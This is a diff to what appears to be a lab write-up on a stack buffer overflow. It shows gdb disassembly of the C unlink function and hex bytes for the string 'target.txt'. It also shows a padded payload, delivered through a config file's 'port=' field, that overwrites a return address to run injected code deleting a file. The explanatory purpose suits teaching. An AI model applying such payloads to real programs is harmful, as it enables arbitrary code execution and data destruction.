@@ -526,8 +526,8 @@ int main(){
     return 0;
 }
 By viewing the file in assembly, we can determine the hex code for "target.txt"
-is 7461 7267 6574 2e74 7874 0a.  Target.txt is 11 bytes long, and we want to
-place it directly after 
+is 7461 7267 6574 2e74 7874 0a.  Target.txt is 11 bytes long, and we will want
+the byte code we just generated to be a target for the c function unlink
 
 (gdb) disas /r unlink
 Dump of assembler code for function unlink:
@@ -543,7 +543,6 @@ Dump of assembler code for function unlink:
    0x00007ffff76c7350 <+32>:    c3      retq
 End of assembler dump.
 
-Unlink is the function in C that can be called to delete files.
 The function places 87 into rax, and then calls the syscall function
 Now that we know how unlink works in machine code, we can write some assembly code ourselves
 so we can see the byte code needed to move the string "target.txt" into unlink
@@ -582,6 +581,13 @@ the text file, target.txt, which will be fed into unlink.
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 00 00 00 00 74 61 72 67 65 
 74 2e 74 78 74 00 00 00 00 00 00 c8 ce ff ff ff 7f 00 00
+
+The code above is the byte code in ascii before being shifted to transformed to
+hex.  It starts with the unlink code, has some zeroes for spacing, then has the
+byte code for target.txt, and finally at the end we have the byte code for the
+address of the line, which when run the return address will execute the address
+for the variable line, go there and run the code for unlink, which will execute
+on the encoded "target.txt" string.  Thus the file will be deleted.
 
 There are 111 zero bytes in between to make it 155 bytes.  We reserve 5 bytes
 for "port=", which the config file requires.  We transform the above from hex
